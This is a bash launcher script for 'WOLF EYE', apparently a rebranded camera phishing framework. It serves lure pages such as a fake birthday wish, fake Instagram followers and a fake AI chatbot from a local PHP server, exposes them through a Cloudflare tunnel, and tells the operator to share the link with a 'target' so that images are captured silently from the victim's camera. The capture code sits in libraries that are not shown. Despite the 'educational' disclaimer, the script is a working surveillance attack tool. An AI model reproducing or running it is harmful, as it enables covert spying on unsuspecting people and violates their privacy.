#!/bin/bash
# WOLF EYE – Camera Phishing Framework
# Rebranded by Nexreaper x Wolf Intelligence
# For educational and authorized testing only.

#────────────────────────────────── WOLF EYE ──────────────────────────────────#
#                                                                              #
# This is a modern camera phishing script. It is capable of silently capturing #
# high-quality images of the victim's camera.                                  #
#──────────────────────────────────────────────────────────────────────────────#

# Colors
red="$(printf '\033[1;31m')"
green="$(printf '\033[1;32m')"
orange="$(printf '\033[1;93m')"
blue="$(printf '\033[1;34m')"
cyan="$(printf '\033[1;36m')"
white="$(printf '\033[1;37m')"
redbg="$(printf '\033[1;41m')"
nocolor="$(printf '\e[0m')"

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
trap terminate INT

# ---------- Load Original Libraries ----------
load_lib() {
    local libs=("check_net.sh" "dis_detect.sh" "banners.sh" "pkage_check.sh" "setup_files.sh" "tunnel.sh" "capture_data.sh" "others.sh" "update.sh")
    for lib in "${libs[@]}"; do
        if [ -f "$SCRIPT_DIR/lib/$lib" ]; then
            source "$SCRIPT_DIR/lib/$lib"
        else
            echo "${cyan}[${red}✖${cyan}]${red} Error:${white} Missing library ${green}$lib${white}"
            exit 1
        fi
    done
}

load_lib

# ---------- Override: Show Banner ----------
show_banner() {
    clear
    echo -e "${red}"
    echo "  ██╗    ██╗ ██████╗ ██╗     ███████╗     ███████╗██╗   ██╗███████╗"
    echo "  ██║    ██║██╔═══██╗██║     ██╔════╝     ██╔════╝╚██╗ ██╔╝██╔════╝"
    echo "  ██║ █╗ ██║██║   ██║██║     █████╗       █████╗   ╚████╔╝ █████╗  "
    echo "  ██║███╗██║██║   ██║██║     ██╔══╝       ██╔══╝    ╚██╔╝  ██╔══╝  "
    echo "  ╚███╔███╔╝╚██████╔╝███████╗██           ███████╗   ██║   ███████╗"
    echo "   ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═           ╚══════╝   ╚═╝   ╚══════╝"
    echo -e "${nocolor}"
}

small_banner() { show_banner; }

banner2() {
    echo -e "${blue}        NEXREAPER x WOLF INTELLIGENCE – Mene${nocolor}"
    echo -e "${cyan}           Advanced Camera Phishing Framework${nocolor}"
    echo -e "${green}      Creator: Ahmad Bilal Qureshi & Wolf Intelligence${nocolor}"
    echo ""
}

credit_msg() {
    echo -e "${cyan}[${green}+${cyan}]${white} Tool  : ${green}WOLF EYE${nocolor}"
    echo -e "${cyan}[${green}+${cyan}]${white} Team  : ${green}Nexreaper x Wolf Intelligence${nocolor}"
    echo -e "${cyan}[${green}+${cyan}]${white} Credit: ${green}Ahmad Bilal Qureshi${nocolor}"
    echo ""
}

exit_msg() {
    echo -e "${cyan}[${green}+${cyan}]${white} Exiting WOLF EYE. Stay dangerous.${nocolor}"
    exit 0
}

# ---------- CORE TUNNEL OVERRIDE (Works with any function name) ----------

# Define the main tunnel function that we want to use
wolfeye_tunnel() {
    local port="${1:-9090}"
    local tunnel_log="cloudflared.log"
    local timeout=60
    local url=""

    echo -e "\n    ${green}<<------ Starting Cloudflared Tunnel ------>>${nocolor}\n"
    echo -e "    ${cyan}[*] Starting PHP server (php)...${nocolor}"
    echo -e "    ${green}[+] Local server: http://127.0.0.1:$port${nocolor}"

    if ! pgrep -f "php -S 127.0.0.1:$port" > /dev/null; then
        php -S 127.0.0.1:"$port" -t ./templates/ > /dev/null 2>&1 &
        PHP_PID=$!
        sleep 2
    fi

    echo -e "    ${cyan}[*] Starting Cloudflared...${nocolor}"
    echo -e "    ${cyan}[*] Generating link, please wait...${nocolor}"

    rm -f "$tunnel_log"
    cloudflared tunnel --url "http://127.0.0.1:$port" --logfile "$tunnel_log" &
    CLOUD_PID=$!

    local count=0
    while [ $count -lt $timeout ]; do
        if [ -f "$tunnel_log" ]; then
            url=$(grep -o 'https://[a-z0-9]*\.trycloudflare\.com' "$tunnel_log" | head -1)
            if [ -n "$url" ]; then
                echo -e "    ${green}[+] Tunnel URL: ${url}${nocolor}\n"
                echo -e "    ${cyan}[+] Share this link with the target.${nocolor}"
                echo -e "    ${cyan}[+] Capture started. Press Ctrl+C to stop.${nocolor}\n"
                return 0
            fi
        fi
        sleep 1
        ((count++))
    done

    kill "$CLOUD_PID" 2>/dev/null
    echo -e "    ${red}[✖] Cloudflared link generation timed out after ${timeout}s.${nocolor}"
    echo -e "    ${orange}[!] Check your cloudflared binary or internet connection.${nocolor}"
    return 1
}

# Override ALL possible tunnel function names from the original lib/
cloudflared_tunnel() { wolfeye_tunnel "$@"; }
cloudflared_link() { wolfeye_tunnel "$@"; }
gen_link() { wolfeye_tunnel "$@"; }
start_cloudflared() { wolfeye_tunnel "$@"; }
start_tunnel() { wolfeye_tunnel "$@"; }
tunnel_start() { wolfeye_tunnel "$@"; }
generate_tunnel() { wolfeye_tunnel "$@"; }
start_tunnel_link() { wolfeye_tunnel "$@"; }

# ---------- Load Tools ----------
load_tools() {
    { clear; show_banner; banner2; echo; }
    print_status "${white}Internet Connection" "$int_status"
    check_requirements "lolcat" "jq" "php" "curl" "wget" "cloudflared"
    sleep 1
}

# ---------- Main Menu ----------
main_menu() {
    { clear; show_banner; banner2; echo; }
cat << EOF
    ${green}<<------ ${white}Select a Template ${green}------>>${nocolor}

    ${cyan}[${orange}1${cyan}]${white} YouTube Live TV
    ${cyan}[${orange}2${cyan}]${white} Birthday Wish
    ${cyan}[${orange}3${cyan}]${white} Secret Message
    ${cyan}[${orange}4${cyan}]${white} Fake Instagram Followers
    ${cyan}[${orange}5${cyan}]${white} Chatting Bot (Fake AI)
    ${cyan}[${red}6${cyan}]${red} Exit ${nocolor}

EOF
    read -p "    ${cyan}[${green}+${cyan}]${white} Select an option:${green} " templates

    case $templates in
        1) setup_youtube_tv ;;
        2) setup_birthday_wish ;;
        3) secret_msg ;;
        4) fake_insta_follower ;;
        5) chating_bot ;;
        6) exit_msg ;;
        *) invalid_options ;;
    esac
}

# ---------- Startup ----------
kill_pid
init_setup
load_tools
check_for_updates
main_menu
